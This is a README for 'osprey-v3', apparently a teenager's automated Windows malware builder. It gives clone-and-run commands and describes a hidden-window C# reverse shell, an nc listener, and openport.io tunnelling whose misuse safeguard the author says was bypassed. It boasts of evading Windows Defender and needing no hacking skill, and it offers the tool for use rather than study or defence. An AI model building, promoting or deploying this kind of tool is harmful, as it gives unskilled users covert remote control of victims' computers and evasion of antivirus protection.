# osprey-v3
osprey-v3 is a tool for 100% automated malware that targets windows, !!networking is automated with openport.io!!, !!! no metasploit !!!, !!! no networking skills reqired !!!, payloads are automated based on /root/.openport/openport.log, automated dependancy installer, only runs on debian based linux distros... please dont moddify the contact info in the scirpt to take credit, it took me a long time and i want credit lmao

check out the video: https://youtu.be/vdgNrggbZtE

using the script:

    sudo apt install git
    git clone https://github.com/9-s3c/osprey-v3/
    cd osprey-v3
    chmod 777
    ./osprey3


![screanshot](https://i.ibb.co/DQGFkcR/Screenshot-from-2020-05-12-18-41-57.png)
================================explaining the script==============================



so i use a linux desktop to do all my development obviosly, i used python3 for the user interface and multithreading,
i used the os.system module to develop allot of the program in bash
i used C# for the backdoor and i used apt to install mono-mcs for compiling
the os.system module automates the installation of mono-mcs
a major problem for hackers and pentesters alike is maintaining a good client/server connection once malware is executed,
most of the time people will use ssh remote forwarding or a proxy server, or sometimes hijack chat applications for data transfer.
what i did is use a service called openport (https://openport.io/), i used os.system with /usr/bin/wget to download a .deb installer for openport,
and used os.system with /usr/bin/dpkg to run the .deb file.
openport is used to allow a public avalable host (almoast like when you host a website) for the malware to connect to when it is run,
openport has a security mesure to preven missuse (thanks openport, i got passed it pretty quickly)
it has a url that is used by the server to authenticate the connecting client "Tell the one you are sending this link to, to first go here: https://us.openport.io/a/aaaaa/aaaaaaaaaaa"
so how did i abuse this???
literaly just wrote 2 extra lines of code that visits the authentication url =\_(0_0)_/=
because openport is installed on the attackers system, it grabs the authentication url from /root/.openport/openport.log
another great thing is that openport keeps the same authentication url every time you run the program as long as you dont change the port.
so i wanted to make this tool 100% automated and make it fast, so it runs openport durring the program setup so that it can create configuration files based on the logfile.
after the setup is finished it saves the configuration files in a new directory path /etc/osprey, it stores the local port, remote host, remote port, url, (todo: aes256 key)
so now that we are done talking about the networking, lets talk malware for a second...
the malware is compiled with mono-mcs on linux (working on a microsoft visual studio version with csc.exe)
the malware is pretty much just a very simple reverse shell targeting the windows command line, its written in C# (I hate microsoft languages with a passion)
there was a problem with using C# early on in development where a big cmd window would appear, because it was compiled with mono,
but i figured out i could just use kernel32.dll and user32.dll with like 2 lines to hide the console window, i cant even remember how i figured that out...
so that pretty much sums up the client side, but what about the server side?
its just a fiew functions called with the threading module in python3.
so the first fuction pretty much uses os.sytem(f"nc -lvvp {LPORT}") for the shell, because i kept having problems with the sockets module.
the second function uses a little file handling to open the user configuration files in /etc/osprey/ and create variables using <variable name>.split,
then it just uses os.system(f"/usr/bin/openport {LPORT}") to automate the server side networking
so that pretty much sums it up... if you want to check it out https://pastebin.com/Qi8BcSQ3,
the users of this program probably dont care how it works, they just want anything that will get past windows defender (this dose)
this is also allot more user friendly than any of the other programs out there, you literaly just run it and it does everything for you so you dont have to be a hacker to use this

i hope you enjoyed my crippling addiction to energy drinks, and i will hopefully finish v4 within the next 2 months...
btw sorry if there are any errors, and sorry if this is program is shit, im 17 and im still learning so please stop calling me a skid
